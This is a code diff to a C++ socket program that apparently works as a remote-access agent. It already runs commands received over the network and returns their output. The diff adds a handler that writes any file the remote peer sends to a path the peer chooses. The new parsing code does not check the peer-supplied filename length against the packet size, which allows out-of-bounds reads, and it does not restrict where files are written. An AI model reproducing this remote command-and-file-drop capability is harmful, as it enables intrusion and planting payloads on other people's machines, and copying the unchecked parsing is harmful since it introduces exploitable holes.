@@ -6,6 +6,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <cstring>
+#include <fstream>
 
 struct PacketHeader {
     uint32_t command_id;
@@ -55,6 +56,14 @@ std::string execute_command(const std::string& command) {
         }
         return output;
     }
+}
+
+void send_response(int sock, uint32_t cmd_id, const std::string &msg) {
+    PacketHeader resp_header{};
+    resp_header.command_id = htonl(cmd_id);
+    resp_header.data_len = htonl(msg.size());
+    send(sock, &resp_header, sizeof(resp_header), 0);
+    send(sock, msg.c_str(), msg.size(), 0);
 }
 
 int main() {
@@ -107,6 +116,29 @@ int main() {
 
                         send(sock, &resp_header, sizeof(resp_header), 0);
                         send(sock, result.c_str(), result.size(), 0);
+                    }
+                    break;
+                }
+                case 2: {
+                    std::vector<uint8_t> payload(req_header.data_len);
+                    if (read_exact(sock, payload.data(), req_header.data_len)) {
+                        uint32_t filename_len;
+                        std::memcpy(&filename_len, payload.data(), 4);
+                        filename_len = ntohl(filename_len);
+
+                        std::string filename(reinterpret_cast<char*>(payload.data() + 4), filename_len);
+
+                        size_t file_offset = 4 + filename_len;
+                        size_t file_size = req_header.data_len - file_offset;
+
+                        std::ofstream out_file(filename, std::ios::binary);
+                        if (out_file) {
+                            out_file.write(reinterpret_cast<char*>(payload.data() + file_offset), file_size);
+                            out_file.close();
+                            send_response(sock, 2, "File saved as: " + filename);
+                        } else {
+                            send_response(sock, 5, "Could't create file");
+                        }
                     }
                     break;
                 }
